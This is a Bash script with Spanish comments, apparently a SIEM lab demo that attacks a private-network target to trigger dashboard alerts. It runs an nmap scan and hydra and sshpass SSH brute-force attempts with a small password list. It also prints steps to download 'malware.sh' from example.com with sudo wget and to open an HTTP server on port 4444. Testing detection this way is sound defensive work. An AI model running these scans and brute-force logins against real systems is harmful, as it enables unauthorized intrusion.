#!/bin/bash
# Script de demo para el SIEM
# Lanza una cascada de ataques contra siem-target
# Cada ataque debería disparar alertas en el dashboard

# IP de la máquina víctima
TARGET="192.168.57.3"

# Colores para los mensajes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'  # No Color

echo -e "${BLUE}╔══════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   DEMO DE ATAQUE AL SIEM - $TARGET   ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════╝${NC}"
echo ""

# ═══════════════════════════════════════════
# Ataque 1: Escaneo de puertos con nmap
# ═══════════════════════════════════════════
echo -e "${YELLOW}[1/5] Escaneo de puertos con nmap...${NC}"
nmap -T4 -F $TARGET
echo ""
sleep 3

# ═══════════════════════════════════════════
# Ataque 2: Fuerza bruta SSH con hydra
# ═══════════════════════════════════════════
echo -e "${YELLOW}[2/5] Fuerza bruta SSH con hydra...${NC}"

# Creamos un diccionario pequeño con contraseñas comunes para la demo
cat > /tmp/passwords.txt << EOF
admin
123456
password
root
toor
EOF

# Lanzamos hydra contra SSH con el diccionario
hydra -l admin -P /tmp/passwords.txt ssh://$TARGET -t 4 -f 2>/dev/null || true
echo ""
sleep 3

# ═══════════════════════════════════════════
# Ataque 3: Intentos directos con ssh fallidos
# ═══════════════════════════════════════════
echo -e "${YELLOW}[3/5] Intentos directos de SSH fallidos...${NC}"
for i in {1..6}; do
    sshpass -p "wrongpassword" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 attacker@$TARGET 2>/dev/null || true
done
echo -e "${GREEN}  → 6 intentos de SSH fallidos generados${NC}"
echo ""
sleep 3

# ═══════════════════════════════════════════
# Ataque 4: Descarga de "malware" simulado
# ═══════════════════════════════════════════
echo -e "${YELLOW}[4/5] Simulando descarga de binario sospechoso...${NC}"
echo -e "${GREEN}  → Este ataque se ejecutaría desde la máquina comprometida${NC}"
echo -e "${GREEN}  → Conéctate a siem-target y ejecuta: sudo wget http://example.com/malware.sh${NC}"
echo ""
sleep 2

# ═══════════════════════════════════════════
# Ataque 5: Apertura de puerto sospechoso
# ═══════════════════════════════════════════
echo -e "${YELLOW}[5/5] Ataque de exfiltración simulado...${NC}"
echo -e "${GREEN}  → Este ataque se ejecutaría desde la máquina comprometida${NC}"
echo -e "${GREEN}  → Conéctate a siem-target y ejecuta: python3 -m http.server 4444${NC}"
echo ""

echo -e "${BLUE}╔══════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║         DEMO COMPLETADA                  ║${NC}"
echo -e "${BLUE}║   Revisa el dashboard del SIEM           ║${NC}"
echo -e "${BLUE}╚══════════════════════════════════════════╝${NC}"